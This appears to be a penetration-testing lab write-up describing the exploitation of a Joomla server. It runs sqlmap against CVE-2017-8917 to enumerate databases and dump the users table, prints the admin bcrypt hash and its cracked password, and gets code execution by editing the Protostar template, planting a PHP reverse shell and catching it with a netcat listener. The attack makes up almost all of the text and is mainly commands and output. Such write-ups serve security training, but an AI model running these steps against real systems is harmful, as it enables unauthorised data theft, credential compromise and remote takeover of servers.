# Exploitation
This phase focuses on exploiting the previously identified vulnerability (`CVE-2017-8917`)  using `sqlmap` to extract database contents via the vulnerable `com_fields` parameter.

## Database Enumeration
Using `sqlmap` the database names were dumped to find the application database:
```bash
sqlmap -u "http://192.168.227.166/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch --dbs
```
Discovered databases:
- information_schema
- joomladb
- mysql
- performance_schema
- sys

The `joomladb` database was identified as the Joomla application database.

## Dumping User Credentials
An initial attempt to dump the `users` table failed due to column resolution:
```bash
sqlmap -u "http://192.168.227.166/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --batch -D joomladb -T "#__users" --dump
```

After reviewing Joomla documentation, the correct table and columns were targeted explicitly:
```bash
sqlmap -u "http://192.168.227.166/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
--batch -D joomladb -T "#__users" -C "name,username,password" --dump
```

This resulted in extracting the administrator credentials:
```
admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
```
The password hash was identified as `bcrypt`.


## Password Cracking
The extracted bcrypt hash was cracked using `hashcat` with the `rockyou.txt` wordlist:
```bash
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```
Recovered credentials:
- `admin` : `snoopy`


## Joomla Admin Access and RCE
Using the recovered credentials, access was gained to the Joomla administrator panel at `/administrator`. The inspection of the Joomla templates revealed that the default **Protostar** template allowed direct modification of `index.php`.

To confirm PHP code execution, a test payload was inserted:
```php
<?php phpinfo(); ?>
```
Reloading the page confirmed PHP execution.

A standard PHP reverse shell was then used:
- Source: `/usr/share/webshells/php/php-reverse-shell.php`
- Attacker IP and port were modified accordingly

A Netcat listener was started on the attacking machine:
```bash
nc -lvnp 5555
```
Refreshing the main page resulted in a reverse shell as the low privilege web user.
